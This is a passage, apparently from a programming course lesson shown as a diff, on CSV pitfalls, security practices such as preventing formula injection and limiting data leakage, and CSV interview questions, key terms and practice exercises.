+- **Parsing with `split(",")`, `cut` or `awk -F,`** on real data with quoted fields.
+- **Writing CSV by joining strings,** without quoting.
+- **Opening and re-saving a CSV in Excel,** which silently strips leading zeros, reformats dates and converts long numbers to `1.23E+15`.
+- **Assuming one line = one row:** quoted fields can contain new lines.
+- **Ignoring the BOM** (`﻿name` column) or the encoding (garbled Urdu/Arabic text).
+- **Guessing the delimiter wrong** for files from other countries (`;`).
+- **Ambiguous dates** like `03/11/2026`. Use ISO `YYYY-MM-DD`.
+- **Floats for money,** and thousands separators left inside numbers (`1,500`).
+- **Importing row by row without validating** the whole file first.
+- **Exporting user text without formula sanitization.**
+
+## Security lens
+
+<Callout type="security">
+A CSV export is a document someone will open on their own computer. Treat every user-supplied cell as untrusted.
+</Callout>
+
+- **CSV/formula injection:** prefix text cells starting with `=`, `+`, `-`, `@`, tab or carriage return with `'`, and validate input fields.
+- **Data leakage:** exports often contain far more personal data than needed. Export only the required columns, protect the download link (authentication, expiry), and don't leave CSVs in public buckets or shared folders. Exposed CSV backups are a very common cause of data breaches.
+- **Upload limits:** cap file size and row count, and stream-process uploads, so a giant file can't exhaust memory (denial of service).
+- **Injection on import:** imported values go into databases and web pages. Use parameterised SQL queries and escape output in HTML, as for any user input.
+- **Integrity:** for financial files, validate totals and checksums (like the balance check in the hands-on) and keep the original file for audit.
+- **Encryption and retention:** CSVs with personal or financial data should be encrypted at rest and deleted when no longer needed.
+
+## Interview questions
+
+<QA q="Why shouldn't you parse CSV by splitting each line on commas?">
+Fields may contain commas, double quotes or even line breaks when they are enclosed in double quotes, and quotes inside fields are escaped by doubling them. Splitting on commas or lines ignores these rules, so columns shift and records are broken. A proper CSV parser handles quoting, escaping, delimiters and multi-line fields correctly.
+</QA>
+
+<QA q="What are the quoting rules in RFC 4180?">
+Fields are separated by commas and records by line breaks. A field containing a comma, a double quote or a line break must be enclosed in double quotes, and a double quote inside a quoted field is represented by two double quotes. A header line is optional, and every record should have the same number of fields.
+</QA>
+
+<QA q="What is CSV injection and how do you prevent it?">
+CSV or formula injection happens when user-controlled data starting with characters such as equals, plus, minus or at is exported to CSV and then interpreted as a formula by a spreadsheet application, which can exfiltrate data through links or trigger other harmful behaviour. Prevent it by prefixing such text cells with a single quote or otherwise neutralising them at export time, while keeping genuine numbers numeric, and by validating input.
+</QA>
+
+<QA q="What problems can a UTF-8 BOM cause with CSV files?">
+Excel often writes a byte order mark at the start of UTF-8 CSV files. Programs that do not strip it read it as an invisible character at the beginning of the first column name, so lookups such as row name fail even though the header looks correct. Reading with an encoding that removes the BOM, such as utf-8-sig in Python, solves this, while writing with a BOM helps Excel display non-ASCII text correctly.
+</QA>
+
+<QA q="How would you process a 10 GB CSV file?">
+Stream it row by row instead of loading it into memory, aggregating results as you go, or process it in chunks with tools like pandas chunksize, DuckDB or Polars. For repeated analysis, load it into a database with a bulk loader such as PostgreSQL COPY or convert it to a columnar format such as Parquet.
+</QA>
+
+## Key terms
+
+<Terms>
+  <Term name="CSV">Comma-separated values: plain-text table, one record per line.</Term>
+  <Term name="RFC 4180">Document describing common CSV rules.</Term>
+  <Term name="Header row">First row containing column names.</Term>
+  <Term name="Delimiter">Character separating fields, such as comma, semicolon or tab.</Term>
+  <Term name="Quoting">Enclosing a field in double quotes so it can contain special characters.</Term>
+  <Term name="TSV">Tab-separated values.</Term>
+  <Term name="BOM">Byte order mark at the start of some UTF-8 files.</Term>
+  <Term name="CRLF / LF">Windows and Unix line endings.</Term>
+  <Term name="Streaming">Processing one row at a time without loading the whole file.</Term>
+  <Term name="CSV injection">Spreadsheet formulas injected through exported data.</Term>
+</Terms>
+
+## Practice
+
+1. Export a sheet from Google Sheets or Excel as CSV, open it in a text editor, and find any quoted fields.
+2. Create a CSV with commas, quotes and new lines inside fields, and compare `cut -d,` with Python's `csv` module.
+3. Write a script that converts `students.csv` to JSON with proper types, and another that converts it back.
+4. Build an upload validator for an "employees.csv" (required columns, valid email, unique employee ID) that reports row numbers.
+5. Generate a 1-million-row CSV and compute totals per category by streaming.
+6. Add the formula-injection sanitizer to an export and open the result in a spreadsheet to see the difference.
+
+Next: **Regular Expressions**.
